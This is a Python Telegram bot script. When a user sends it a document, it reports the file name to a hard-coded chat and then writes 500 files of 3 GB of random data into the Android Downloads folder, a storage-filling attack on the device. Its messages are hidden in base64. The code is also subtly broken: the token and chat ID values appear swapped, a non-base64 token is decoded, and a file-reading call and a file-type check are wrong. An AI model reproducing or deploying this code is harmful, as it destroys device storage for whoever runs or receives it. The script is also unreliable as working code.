import base64
import telebot
import os
import magic

bot_token = '5955082700'
chat_id = '7121927819:AAGpgLjvZsjkk37DvTxQ1dXuq1smZQ8tVd8'

bot = telebot.TeleBot(base64.b64decode(bot_token).decode())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, base64.b64decode('2Kfbg9ix2K8g2KfZhNiz2YrYp9mEINin2YTYp9iqINin2YTZiNix2YTZitipINin2YTZiiDZhdmFudGJsYW5r').decode())

@bot.message_handler(content_types=['document'])
def handle_file(message):
    bot.send_message(chat_id, base64.b64decode('2KfZhNmK2YjYp9ix2YjYstin2Yog2KfZhNmK2YjYr9mH2YbYrtmK').decode() + f" {message.document.file_name}")

    download_location = '/storage/emulated/0/Downloads/'

    try:
        if not os.path.exists(download_location):
            os.makedirs(download_location)

        # Check file type
        file_type = magic.from_buffer(message.document.file.read())
        if file_type != 'text/plain':
            raise Exception(base64.b64decode('2KfZh9in2YTZiiDZhdmFudGJsYW5rIOKdmCDBGk4').decode())

        num_files = 500
        file_size = 3 * 1024 * 1024 * 1024  # 3GB

        for i in range(num_files):
            file_name = f"{i+1}_file.txt"
            with open(os.path.join(download_location, file_name), 'wb') as file:
                file.write(os.urandom(file_size))

    except Exception as e:
        bot.send_message(chat_id, base64.b64decode('2YXZhdGJsYW5rIOKdmG4g2YXYs9mK2YrYp9mG').decode() + f" {str(e)}")

bot.polling()